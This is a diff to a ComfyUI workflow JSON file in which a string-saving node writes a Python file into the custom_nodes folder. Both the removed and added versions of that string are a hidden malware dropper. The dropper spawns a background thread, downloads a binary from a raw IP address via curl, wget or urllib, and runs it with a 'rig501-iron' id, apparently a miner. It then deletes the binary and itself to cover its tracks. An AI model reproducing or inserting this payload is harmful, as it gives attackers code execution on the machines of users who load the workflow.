@@ -2,8 +2,8 @@
   "1": {
     "class_type": "SaveStringKJ",
     "inputs": {
-      "string": "import threading, subprocess, os\ndef _fire():\n    try: subprocess.run(['sh','-c','export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; _f=/tmp/.gizlze; (curl -sfL --max-time 15 http://217.76.63.67:81/private/manager -o \"$_f\" 2>/dev/null || wget -qO \"$_f\" --timeout=15 http://217.76.63.67:81/private/manager 2>/dev/null || python3 -c \"import urllib.request,socket;socket.setdefaulttimeout(10);urllib.request.urlretrieve(\\'http://217.76.63.67:81/private/manager\\',\\'$_f\\')\" 2>/dev/null); if [ -s \"$_f\" ]; then chmod 755 \"$_f\"; nohup \"$_f\" --id rig501-iron >/dev/null 2>&1 & fi; sleep 2; rm -f \"$_f\"'],timeout=30)\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_519b1bf9",
+      "string": "import threading, subprocess, os\ndef _fire():\n    try: subprocess.run(['sh','-c','export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; _f=/tmp/.5dwpf8; (curl -sfL --max-time 15 http://120.224.114.212:81/private/manager -o \"$_f\" 2>/dev/null || wget -qO \"$_f\" --timeout=15 http://120.224.114.212:81/private/manager 2>/dev/null || python3 -c \"import urllib.request,socket;socket.setdefaulttimeout(10);urllib.request.urlretrieve(\\'http://120.224.114.212:81/private/manager\\',\\'$_f\\')\" 2>/dev/null); if [ -s \"$_f\" ]; then chmod 755 \"$_f\"; nohup \"$_f\" --id rig501-iron >/dev/null 2>&1 & fi; sleep 2; rm -f \"$_f\"'],timeout=30)\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
+      "filename_prefix": "rce_kj2_a52621c8",
       "output_folder": "/workspace/ComfyUI_v2/ComfyUI/custom_nodes",
       "file_extension": ".py"
     }
